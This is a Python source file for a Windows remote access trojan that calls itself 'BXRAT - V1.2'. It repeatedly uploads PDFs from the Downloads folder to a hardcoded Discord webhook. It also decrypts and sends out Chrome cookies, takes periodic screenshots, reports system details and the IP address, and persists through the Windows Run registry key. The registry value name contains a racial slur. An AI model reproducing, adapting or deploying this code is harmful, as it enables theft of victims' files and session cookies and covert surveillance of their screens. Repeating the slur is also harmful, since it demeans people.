import time
import threading
import requests
from PIL import ImageGrab
import io
import os
import winreg
import platform
import socket
import json
import win32crypt
import sqlite3


webhook_url = "https://discord.com/api/webhooks/1079350643413762062/PFhXhfER5tw1FvmEKmR2ns38a1g4ViXDQTCOCjTxS35gdFTWxcXG1rfQTj6RTsIBbVbf"




def send_pdfs_to_webhook(directory_path):
    files = os.listdir(directory_path)
    pdf_files = [f for f in files if f.endswith(".pdf")]
    for pdf_file in pdf_files:
        with open(os.path.join(directory_path, pdf_file), "rb") as f:
            file_content = f.read()
        payload = {
            "file": (pdf_file, file_content, "application/pdf")
        }
        response = requests.post(webhook_url, files=payload)
        if response.status_code != 200:
            print(f"Failed to post {pdf_file} to Discord webhook")

def send_pdfs_periodically():
    directory_path = "C:/Users/User/Downloads"
    send_pdfs_to_webhook(directory_path)
    threading.Timer(100.0, send_pdfs_periodically).start()

send_pdfs_periodically()





def get_chrome_cookies():
    cookies_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Cookies")
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute('SELECT name, value, host_key FROM cookies')
    cookies = cursor.fetchall()
    cursor.close()
    conn.close()
    result = []
    for name, value, host_key in cookies:
        encrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1]
        cookie = {"name": name, "value": encrypted_value.decode(), "host_key": host_key}
        result.append(cookie)
    return result

def post_cookies_to_webhook():
    cookies = get_chrome_cookies()
    payload = {"content": "Chrome Cookies", "embeds": [{"title": "Cookies", "description": json.dumps(cookies)}]}
    response = requests.post(webhook_url, json=payload)
    if response.status_code != 200:
        print("Failed to post cookies to Discord webhook")
threading.Timer(60.0, post_cookies_to_webhook).start()





def post_screenshot():
    screenshot = ImageGrab.grab(all_screens=True)
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_bytes = img_bytes.getvalue()
    payload = {
        "file": ("screenshot.png", img_bytes, "image/png")
    }
    response = requests.post(webhook_url, files=payload)
    if response.status_code != 200:
        print("Failed to post screenshot to Discord webhook")
    threading.Timer(3600.0, post_screenshot).start()





def post_system_info():
    system_info = platform.uname()
    ip_address = socket.gethostbyname(socket.gethostname())
    payload = {
        "content": "PC specs and IP address:",
        "embeds": [
            {
                "title": "System Info",
                "description": f"**System**: {system_info.system}\n**Node**: {system_info.node}\n**Release**: {system_info.release}\n**Version**: {system_info.version}\n**Machine**: {system_info.machine}\n**Processor**: {system_info.processor}",
                "color": 15158332
            },
            {
                "title": "IP Address",
                "description": ip_address,
                "color": 15158332
            }
        ]
    }
    response = requests.post(webhook_url, json=payload)
    if response.status_code != 200:
        print("Rat Injected!")


def register_startup():
    script_path = os.path.abspath(__file__)
    startup_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_WRITE
    )
    winreg.SetValueEx(
        startup_key,
        "IFYOUSEETHSIITSTOLATENIGGER",
        0,
        winreg.REG_SZ,
        script_path
    )
    winreg.CloseKey(startup_key)
    print("BXRAT - V1.2")





register_startup()
post_system_info()
threading.Timer(10.0, post_screenshot).start()



while True:
    time.sleep(1)
